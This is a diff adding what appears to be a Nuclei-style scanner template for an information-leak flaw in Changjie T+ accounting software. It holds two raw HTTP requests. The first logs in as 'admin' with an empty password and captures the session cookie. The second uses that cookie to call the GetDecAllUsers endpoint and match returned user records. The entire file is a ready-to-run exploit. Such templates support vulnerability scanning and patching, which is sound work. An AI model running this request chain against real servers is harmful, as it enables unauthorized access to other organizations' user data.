@@ -1,0 +1,53 @@
+id: poc-yaml-changjie-tplus-getdecallusers-information-leak
+info:
+  name: Changjie T+ GetDecAllUsers Information Leak
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: information-leak
+http:
+  - raw:
+      - |
+        POST /tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"AccountNum": "000", "UserName": "admin", "Password": "", "rdpYear": "2023", "rdpMonth": "5", "rdpDate": "17", "webServiceProcessID": "admin", "ali_csessionid": "", "ali_sig": "", "ali_token": "", "ali_scene": "", "role": "", "aqdKey": "", "fromWhere": "browser", "cardNo": ""}
+    extractors:
+      - type: regex
+        name: session_cookie
+        part: header
+        internal: true
+        regex:
+          - "ASP.NET_SessionId=([^;]+)"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"error\""
+      - type: word
+        part: header
+        words:
+          - "Cookie"
+  - raw:
+      - |
+        POST /tplus/sm/privilege/ajaxpro/Ufida.T.SM.UIP.Privilege.PreviligeControl,Ufida.T.SM.UIP.ashx?method=GetDecAllUsers HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Cookie: ASP.NET_SessionId={{session_cookie}}
+
+        {"condition": "", "accNum": "", "onlyBuying": "false"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"value\""
+          - "UserId"
+          - "UFTData"
